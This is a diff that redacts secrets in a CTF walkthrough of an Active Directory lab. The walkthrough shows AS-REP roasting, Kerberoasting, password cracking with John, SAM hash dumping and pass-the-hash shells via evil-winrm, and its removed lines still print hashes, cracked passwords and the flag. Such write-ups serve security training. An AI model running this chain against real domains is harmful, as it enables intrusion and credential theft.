@@ -221,7 +221,7 @@ getting file \Enterprise-Sync.txt of size 496 as Enterprise-Sync.txt (0.6 KiloBy
 smb: \> exit
 
 
-I GOT TO KNOW THAT "IPC$" SHARE IS READABLE, LETS CHECK IT ALSO: (THIS MEANS USERNAME ENUMERATION)
+I GOT TO KNOW THAT "IPC$" SHARE IS READABLE, LETS ALSO CHECK IT: (THIS MEANS USERNAME ENUMERATION)
 ======================================================================
 
 	IPC$                                              	READ ONLY	Remote IPC
@@ -286,7 +286,7 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 [-] User guest doesn't have UF_DONT_REQUIRE_PREAUTH set
 [-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
 [-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
-$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:a7f74574c7436b61996c3ea04112a319$ecd5818b9bdd73664bba707826822d38d2c1865077dfe50543fdf68f7a470312de5c1b4d21de282ba385e0a919d86dd9f5796dbe78e2355cb6cc684844b5442ec1d0aac2096fc502013bfca43276b1765292ab38504d58e1167b3a15de4de940a08077318412483fc64c73870389e8a5864d45a67c796195fbe87f41da6557b531d91e3416958ac62fbeb5ff1256c629c9d94ba1d7de18ef4c611cceea39b24e040caa70d33de7f0d81f962a2425e00456a87f378f70dc14bc892f5e4d35baaec8f0170afeeb969a45dcb267c9316ecaaaf1b1ec5e989582d20946ce731166d792c0aeab9eff1810a9535067fb515195b46cc7cf22f8
+$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:{{REDACTED}}
 [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
 [-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
 [-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
@@ -300,14 +300,14 @@ Using default input encoding: UTF-8
 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
 Will run 2 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)
+REDACTED        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)
 1g 0:00:00:09 DONE (2021-05-16 08:03) 0.1086g/s 345488p/s 345488c/s 345488C/s tj130999..tj0216044
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 
 
 
-AFTER LOGGING IN USING THE 'GetUsersSPNs', I GOT ANOTHER USER HASH:
+AFTER LOGGING IN USING THE 'GetUsersSPNs', I GOT ANOTHER USER HASH:(Kerberosting)
 =======================================================================
 
 # impacket-GetUserSPNs 'vulnnet-rst.local/t-skid:tj072889*' -outputfile hashes -dc-ip 10.10.50.95
@@ -317,11 +317,6 @@ ServicePrincipalName    Name                MemberOf                            
 ----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
 CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 14:45:09.913979  2021-03-13 18:41:17.987528             
 
-┌──(root💀kali)-[~/vulnnet6]
-└─# cat hashes 
-$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$96c4aabc2a993017493a1324c47504e3$1a1359c48a5062d2190c0b81b0a4a6b6767113332da45d4e9805ebe20cbcd956976963ab60b0b8b83a0c44e62f50dcd10b96611d71d250eee340e8ecb4596d78bd18cc3d51ff12d90849bf88388c15e5d3bcb68e491021b883ab6ec43e70de5bed088b7d6606ecedadfc6430793af5d45b119f1f4d5d449e085fd102bf5f8ea5ab93a6cdb41c3a4f5c65fd6aa25f5179f7c6d058b3c7cf354d4f265c4de5c12f4de166dee4567bf7e5593ccfa60725d5767bf3d2a1ba82d746c8135799aa33f158151540289a7a357d0a4ac09d2bd44a69c513f1d385b78c9dda3d376fc8cbdbd0ccd7b5d6e4daed230f3afe42f4d5093e8c9b7e98eb8303cf042bee7ce83df07fa4fbae91d612ff224460ef8aa19083b9b553b3ce3829aa5db5efd0dbcf086f55812f440dfb5439230fe36622509d08f72c1cdbef2a7f9162536c04b47ba7697a256da5e7d816a53d01dffa4572b1e5f711080b2faea70266a1b1bdfadf9e858b35328f2ca271f79c10ae3d32e1732c79d57a1cf46f1398897cb9c58f235bd48106b94d0aa3bdf49fe177039a463789f92962cb361d5b968d7980aa0eaff420ae6207852254d58edca25692acc79eeca951c1d8782f4dd7096ca58555e7fac43c6928c54d51aedeb5916be3785e7f7b74946ff9d85a9009344d351e6e057866dfd3a45a100d8ccb0e64bcb2fbc1bf34902714e853be28434b891f1719867fde1c6c0150cbbbcaa80daf21c67dbe3b512e6b58b81074d109d29be9b5b22625afdb2bcb0edc1821c2243dfe659bde1d2ffcdc79a9901b2fb62fb168b5a84aa685b01a25b6609d36fcefae61de1367ee9ce1cae5ff752d22f1b4e9712559db1fccc8c92c6a51b41f40760345ff60c75e36414a2b855508728454286851f216627b3d3096b690a6d164f51f82deb9a9565ee7de7d4d8ae3462bf2acfbd5810b8ce3208321ee02739403e47e8b72f398aedf6b2a4018dc2f2313ba5ff79d341f9bd2252f184b96a16c99118b25193d691f588b63dbafc1bdce2c7394b712416bcb3471902c03546b7db3f5c660d279cda9ad57789b743995b47d1978b4c82ba62106d02da3e06bb24604bb7501fd407cad1229aad98f876813bdd9152f6c1f3a3bfd559e8bcf2bf569b95692a09e652e12a4da83c0e6a29e57057ccffb4d7fe38ba2ffe69248a750c84a9c1a79cb38ff5a60d7441a2e6973fd0dcb57b70c9cc942eb9063a934b31edb9be904efe20e2dc82634cd0fff8b20db2d61ecd2c66052d9ba6df15530291155498e61729ed30b775ed48f24ff1170814b925342a2400e5e60a1ef7c7450cbbab844ae99620a9ad6c9c91bca0ed745c1af5945f05a22292efe67a9ead449c2d8fc0343bd8fdedf77ac31619d1a2d975a94ab90e72d32
-
-
 CRACKING IT WITH JOHN THE RIPPER:
 ===================================
 # john --wordlist=/usr/share/wordlists/rockyou.txt hashes 
@@ -329,7 +324,7 @@ Using default input encoding: UTF-8
 Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
 Will run 2 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-ry=ibfkfv,s6h,   (?)
+REDACTED   (?)
 1g 0:00:00:07 DONE (2021-05-16 08:08) 0.1259g/s 517416p/s 517416c/s 517416C/s ryan0318..ry=iIyD{N
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed
@@ -337,7 +332,7 @@ Session completed
 GOT THE SHELL:
 =================
 
-# evil-winrm -i 10.10.50.95 -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,'
+# evil-winrm -i 10.10.50.95 -u 'enterprise-core-vn' -p 'REDACTED'
 Evil-WinRM shell v2.4
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> ls
@@ -391,7 +386,7 @@ smb: \vulnnet-rst.local\scripts\>
 LETS CHECK THIS FILE
 --------------------------
 strUserNTName = "a-whitehat"
-strPassword = "bNdKVkjv3RR9ht"
+strPassword = "REDACTED"
 
 
 GOT CREDS OF A ANOTHER USER
@@ -406,13 +401,13 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 [*] Starting service RemoteRegistry
 [*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:REDACTED:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 
 NOW USE "EVIL_WINRM" TO GET A SHELL:
 =======================================
-# evil-winrm -i 10.10.135.79 -u 'Administrator' -H 'c2597747aa5e43022a3a3049a3c3b09d'
+# evil-winrm -i 10.10.135.79 -u 'Administrator' -H 'REDACTED'
 Evil-WinRM shell v2.4
 Info: Establishing connection to remote endpoint
 
@@ -420,7 +415,7 @@ Info: Establishing connection to remote endpoint
 vulnnet-rst\administrator
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> cat system.txt
-THM{16f45e3934293a57645f8d7bf71d8d4c}
+THM{REDACTED}
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> 
 
 GOT THE ROOT FLAG
